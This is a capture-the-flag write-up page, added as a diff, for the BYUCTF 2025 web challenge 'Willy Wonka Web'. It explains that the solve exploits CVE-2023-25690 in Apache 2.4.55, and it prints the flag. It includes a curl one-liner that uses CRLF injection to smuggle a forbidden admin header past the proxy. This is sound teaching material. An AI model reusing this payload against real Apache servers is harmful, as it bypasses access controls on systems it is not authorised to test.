@@ -1,0 +1,75 @@
+---
+title: "Willy Wonka Web — BYUCTF 2025"
+date: 2026-06-27
+author: "Imattas aka Zemi"
+slug: "byuctf-2025-willy-wonka-web"
+order: 278
+writeupKind: "challenge"
+ctfSlug: "byuctf-2025"
+ctfTitle: "BYUCTF 2025"
+---
+
+# Willy Wonka Web — BYUCTF 2025
+
+> **Category:** `Web Exploitation`  
+> **Author:** Imattas aka Zemi  
+> **Flag:** `byuctf{i_never_liked_w1lly_wonka}`  
+> **Source Path:** `web/wonka`
+
+---
+
+## Challenge Description
+
+```text
+Welcome to the world of web! Can you get the flag?
+
+https://wonka.chal.cyberjousting.com
+
+[wonka.zip]
+```
+
+---
+
+## Provided Materials
+
+- [Repository folder](https://github.com/BYU-CSA/BYUCTF-2025/tree/main/web/wonka)
+- [web/wonka/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wonka/README.md)
+- [web/wonka/wonka.zip](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wonka/wonka.zip)
+
+---
+
+## Recon / Initial Analysis
+
+This page imports the BYUCTF 2025 source material for the Web Exploitation challenge **Willy Wonka Web**. The prompt is kept separate from the solve notes, and upstream artifacts are linked so the challenge can be replayed from the original repository.
+
+---
+
+## Vulnerability / Observation
+
+The useful observation comes from the imported solve notes below. I kept the original technical path intact while normalizing the page metadata, challenge grouping, and author attribution for the Volume 2 writeup archive.
+
+---
+
+## Exploitation / Solution
+
+Source: [web/wonka/README.md](https://github.com/BYU-CSA/BYUCTF-2025/blob/main/web/wonka/README.md)
+
+This problem requires exploiting CVE-2023-25690 in Apache 2.4.55 which leads to request smuggling from a CRLF injection. Since NodeJS doesn't support multiple HTTP requests in a single TCP stream (from the HTTP/1.1 spec), you need to smuggle a "forbidden" header that Apache unsets/blocks. The following one-liner is the solution:
+
+`curl 'https://wonka.chal.cyberjousting.com/name/a%20HTTP/1.1%0d%0aa:%20admin%0d%0aX-Bad:'`
+
+**Flag** - `byuctf{i_never_liked_w1lly_wonka}`
+
+---
+
+## Full Exploit Script
+
+No standalone exploit script was present in the selected source material.
+
+---
+
+## Key Takeaways
+
+- The BYUCTF 2025 challenge material is preserved with local archive formatting.
+- The page author is normalized to Imattas aka Zemi.
+- The source repository remains linked for handouts, services, and solve artifacts.
